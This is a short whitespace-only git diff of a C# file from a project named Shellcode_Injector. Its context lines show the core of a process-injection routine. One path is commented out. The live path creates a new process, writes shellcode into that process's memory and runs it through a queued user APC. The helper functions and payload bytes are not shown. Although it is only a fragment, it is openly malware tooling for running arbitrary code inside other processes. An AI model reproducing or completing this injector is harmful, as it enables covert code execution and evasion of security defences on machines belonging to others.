@@ -1,6 +1,5 @@
 ﻿using System;
 
-
 namespace Shellcode_Injector
 {
     internal class Runner
@@ -24,10 +23,12 @@ namespace Shellcode_Injector
             //IntPtr rmem = Helpers.MWrite(phand, shellcode);
             //Helpers.SCRun("crt", phand, rmem);
 
+
             // queue user apc flow trough creating new process
             WinApi.PIN pinfo = Helpers.StartS();
             IntPtr mem = Helpers.MWrite(pinfo.hProcess, shellcode);
             Helpers.SCRun("qua", pinfo.hThread, mem);
+
 
         }
     }
